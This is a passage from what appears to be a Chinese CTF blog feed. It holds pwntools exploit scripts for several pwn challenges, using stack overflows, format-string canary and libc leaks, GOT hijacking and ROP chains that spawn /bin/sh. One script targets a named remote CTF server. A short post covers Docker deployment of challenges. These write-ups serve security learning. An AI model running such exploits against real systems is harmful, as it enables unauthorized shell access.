p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(leave_ret)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;something?&#x27;</span>, payload)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(one) + <span class="string">&#x27;\x1f&#x27;</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Bye?&#x27;</span>, payload)</span><br><span class="line">    leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak - <span class="number">0x80aa0</span></span><br><span class="line">    success(<span class="string">&#x27;PUTS: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(leak)))</span><br><span class="line">    success(<span class="string">&#x27;LIBC: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    og = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>]</span><br><span class="line">    payload = p64(og[<span class="number">2</span>] + libc_base)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag_shop"></a>flag_shop</h1><p>配合 work 和 buy 功能将钱数降至 0，这样就能构造出包含 $0; 的字符串，然后用寄存器传参把 $0 给 system 调用即可。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data: p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,data: p.sendafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data: p.sendlineafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">r = <span class="keyword">lambda</span> num=<span class="number">4096</span>: p.recv(num)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span>: p.recvuntil(delims,drop)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr: log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./flag_shop&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(binary)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Exit\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;have $&#x27;</span>)</span><br><span class="line">money = <span class="built_in">int</span>(r(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&#x27;[yes/no]&#x27;</span>, <span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">money += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">times = money / <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    sla(<span class="string">&#x27;Exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;[yes/no]&#x27;</span>, <span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = <span class="number">0x602080</span></span><br><span class="line">pop_rdi = <span class="number">0x400e03</span></span><br><span class="line">sla(<span class="string">&#x27;Exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>), pop_rdi, msg+<span class="number">15</span>, elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sla(<span class="string">&#x27;[yes/no]&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="马大师的绝招"><a href="#马大师的绝招" class="headerlink" title="马大师的绝招"></a>马大师的绝招</h1><p>格式化字符串漏洞和栈溢出。</p><p>格式化字符串漏洞可以泄露canary和libc地址，栈溢出劫持执行流。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p=process(<span class="string">&quot;pwn-end&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 列表字符串转int,包含一个输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_int</span>(<span class="params">content</span>):</span></span><br><span class="line">    content=<span class="built_in">int</span>(content,<span class="number">16</span>)</span><br><span class="line">    out=<span class="built_in">hex</span>(content)</span><br><span class="line">    print(<span class="string">&quot;content to int end is : &quot;</span>,out)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formate_result</span>(<span class="params">spli=<span class="string">&quot;0x&quot;</span>,length=<span class="number">12</span></span>):</span></span><br><span class="line">    info=p.recvuntil(<span class="string">&quot;0x&quot;</span>,drop=<span class="string">&quot;true&quot;</span>)</span><br><span class="line">    info=info[<span class="number">0</span>:length]</span><br><span class="line">    print(<span class="string">&quot;leak info (may set a and b to get real info) : &quot;</span>,info)</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&quot;!!!!!!!\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x00000000004007EE&quot;)</span></span><br><span class="line">p.send(<span class="string">&quot;%21$p%15$p&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">info=get_formate_result()</span><br><span class="line">info=get_formate_result() <span class="comment">#libc</span></span><br><span class="line">libc.address=get_int(info)-<span class="number">0x20840</span></span><br><span class="line">info=p.recv(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">canary=get_int(info)</span><br><span class="line"><span class="comment">#content=p.recv(32)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;flag!!!\n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x38</span>+p64(canary)+p64(canary)+p64(<span class="number">0x00000000004008f3</span>)+p64(libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>())+p64(libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="接化发"><a href="#接化发" class="headerlink" title="接化发"></a>接化发</h1><p>利用任意地址写泄露 libc 并进行 GOT 劫持。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data: p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,data: p.sendafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data: p.sendlineafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">r = <span class="keyword">lambda</span> num=<span class="number">4096</span>: p.recv(num)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span>: p.recvuntil(delims,drop)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr: log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary,checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(binary, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;：&#x27;</span>, <span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">attack = <span class="number">0x602120</span></span><br><span class="line">stdin = <span class="number">0x6020b0</span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(attack-stdin):</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    addr += r(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = uu64(addr)</span><br><span class="line">leak(<span class="string">&#x27;stdin&#x27;</span>, addr)</span><br><span class="line">base = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>, base)</span><br><span class="line">system = p64(base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(stdin-printf+<span class="number">6</span>):</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    s(system[i])</span><br><span class="line">    ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">s(system[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="Dmctf2020" scheme="http://example.com/categories/Dmctf2020/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf题目环境搭建</title>
    <link href="http://example.com/2020/11/27/ctf%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2020/11/27/ctf%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-11-27T15:46:49.000Z</published>
    <updated>2020-12-04T08:44:19.240Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="关于docker："><a href="#关于docker：" class="headerlink" title="关于docker："></a>关于docker：</h1><p>基本命令：（注意权限问题，没有设置权限组时需要加sudo）</p><p>docker ps -a  查看容器</p><p>docker ps  查看正在运行中的容器</p><p>docker images 查看镜像</p><p>service docker start 启动docker服务</p><p>docker start 容器id 启动一个已经停止的容器</p><p>docker stop 容器id  停止一个已经启动的容器</p><p>docker rm 容器id 删除一个容器</p><p>docker rmi 镜像name 删除本地的一个镜像</p><p>docker run -it 镜像名称 /bin/bash 使用某一镜像来运行容器</p><p>docker run -it 容器id /bin/bash 启动某一容器（退出时容器会关闭）</p><p>docker exec -it 容器id /bin/bash 启动某一容器（退出时容器不会关闭）</p><p>docker export 1e560fca3906(容器id） &gt; ubuntu.tar 导出容器 1e560fca3906 快照到本地文件 ubuntu.tar</p><p>cat docker/ubuntu.tar | docker import - test/ubuntu:v1 使用 docker import 从容器快照文件中再导入为镜像， 将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1</p><h2 id="题目环境搭建："><a href="#题目环境搭建：" class="headerlink" title="题目环境搭建："></a>题目环境搭建：</h2><p>使用pwn_deploy_chroot部署是目前最方便最安全的方法。</p><p>已经搭建好docker后，</p><p>安装 docker compose 和 git</p><p>sudo apt install docker-compose git</p><p>把仓库克隆到本地</p><p>git clone <a href="https://github.com/giantbranch/pwn_deploy_chroot.git">https://github.com/giantbranch/pwn_deploy_chroot.git</a></p><p><img src="/postimg/11.png"></p><p>使用方法：</p><p>1、将所有的pwn题目放入bin目录中</p><p><img src="/postimg/12.png"></p><p>2、python initialize.py</p><p><img src="/postimg/13.png"></p><p>3、 docker-compose up –build -d</p><p><img src="/postimg/14.png"></p><p>用netstat -antp | grep docker查看，确认完成</p><p><img src="/postimg/15.png"></p><p>可以在 config.py中修改配置。</p><p>You can edit config.py to decide whether to replace /bin/sh with catflag</p><p># Whether to replace /bin/sh</p><p>## replace</p><p>REPLACE_BINSH = True</p><p>## not replace(default)</p><p>REPLACE_BINSH = False</p><p>（__注:此docker可以在一个contain中开启多个题目__）</p><p><strong>注：可以使用以下dockers搭建环境，不过一个contain中只可以开启一个题目，常适用与当前ctf比赛环境的搭建</strong></p><p>链接：<a href="https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/">https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="环境搭建" scheme="http://example.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>无输出操作之__do_global_dtors_aux</title>
    <link href="http://example.com/2020/11/27/%E6%97%A0%E8%BE%93%E5%87%BA%E6%93%8D%E4%BD%9C%E4%B9%8B-do-global-dtors-aux/"/>
    <id>http://example.com/2020/11/27/%E6%97%A0%E8%BE%93%E5%87%BA%E6%93%8D%E4%BD%9C%E4%B9%8B-do-global-dtors-aux/</id>
    <published>2020-11-27T15:32:42.000Z</published>
    <updated>2020-12-04T08:47:02.509Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>__do_global_dtors_aux中有一个gadget可以修改stack上的数据。</p><p><img src="/postimg/01.png"></p><p>add [rbp-3Dh],ebx（当rbp和ebx可控时，我们就可以修改rbp-0x3d地址里面的内容，从而获取想要的真实地址。）</p><p><img src="/postimg/02.png"></p><p><img src="/postimg/03.png"></p><p><img src="/postimg/04.png"></p><p>nx保护，got表不可改。栈溢出，并且没有任何可输出的函数。首先想到的是利用dl_runtime_reslove,但是dl_runtime_reslove常用于32，并且实操后发现执行不通。</p><p>利用思路：<br> 1、迁移到bss段<br> 2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布。<br> 3、找到一个能用的真实地址，利用神奇的gadget，把他伪造成system，再次跳回到main函数。<br> 4、栈溢出构造system(‘/bin/sh’)</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pwn_name = <span class="string">&quot;no_leak&quot;</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">ip, port = <span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10002</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">&quot;l&quot;</span>:</span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span>(<span class="params">func</span>):</span></span><br><span class="line">    success(<span class="string">&#x27;&#123;&#125; =&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">con,leak</span>):</span></span><br><span class="line">    success(<span class="string">&#x27;&#123;&#125; =&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">address=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">&quot;b *&#123;:#x&#125;\nc\n&quot;</span>.<span class="built_in">format</span>(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">&quot;b *$rebase(&#123;:#x&#125;)\nc\n&quot;</span>.<span class="built_in">format</span>(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span>(<span class="params">gadget1,gadget2,func_got,rdi,rsi,rdx</span>):</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(0x40055A)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- s</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload =&#x27;/bin/sh\x00&#x27;+&#x27;b&#x27;*0x80</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rdi_ret)+p64(binsh)+p64(system)不可行方案</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>第一次payload：<br> 栈迁移之后再次ret到read函数。此时rbp已经被覆盖为bss段地址，并且再次执行read函数</p><p><img src="/postimg/05.png"></p><p><img src="/postimg/06.png"></p><p>第二次payload：<br> 栈迁移往0x601510处读入我们调用libc_start_main的payload。<br> 通用gadget  <strong>—csu—</strong> ：</p><p><img src="/postimg/07.png"></p><p><img src="/postimg/08.png"></p><p><img src="/postimg/09.png"></p><p><img src="/postimg/010.png"></p><p><img src="/postimg/011.png"></p><p>可以看到第一个参数main地址，利用中级栈溢出的方式，成功实现了调用libc_start_main。</p><p><img src="/postimg/012.png"></p><p>第三次payload：<br> 再次read，当我们进去看时，就会发现除了我们的再次输入外，在bss上留下还有一些libc的地址：</p><p>选择0x601458作为我们的牺牲品，通过神奇的gadget，add它和system的偏移，就可以把它改成system，同时它的bss地址可以看成是system的伪got表地址。</p><p><img src="/postimg/013.png"></p><p>关于偏移：<br> 在magic_gadget中，add[rbp-0x3d],所以我们0x601458只有加0x3d才是rbp的位置，才能控制rbp。</p><p><img src="/postimg/014.png"></p><p><img src="/postimg/015.png"></p><p>第四次payload：<br> 改成功了，接着再次回到main函数，直接写binsh到首部，然后中级栈溢出调用system就可以getshell了：</p><p><img src="/postimg/016.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="__do_global_dtors_aux" scheme="http://example.com/categories/do-global-dtors-aux/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Geekpwn_pwn_writeup</title>
    <link href="http://example.com/2020/11/27/Geekpwn-pwn-writeup/"/>
    <id>http://example.com/2020/11/27/Geekpwn-pwn-writeup/</id>
    <published>2020-11-27T05:06:17.000Z</published>
    <updated>2020-11-27T05:16:59.821Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="jichu"><a href="#jichu" class="headerlink" title="jichu"></a>jichu</h2><p><strong>exp:</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;172.18.0.1&#39;,10000)</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;jichu&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh&#x3D;0x080482ea</span><br><span class="line">system&#x3D;elf.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x48+&#39;aaaa&#39;+p32(system)+p32(0xdeadbeef)+p32(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;Please input admin password:&#39;,&#39;administrator&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Please input new log info:&#39;,payload)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.sendline(&#39;cat flag&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn00"><a href="#pwn00" class="headerlink" title="pwn00"></a>pwn00</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,1000)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn00&quot;)</span><br><span 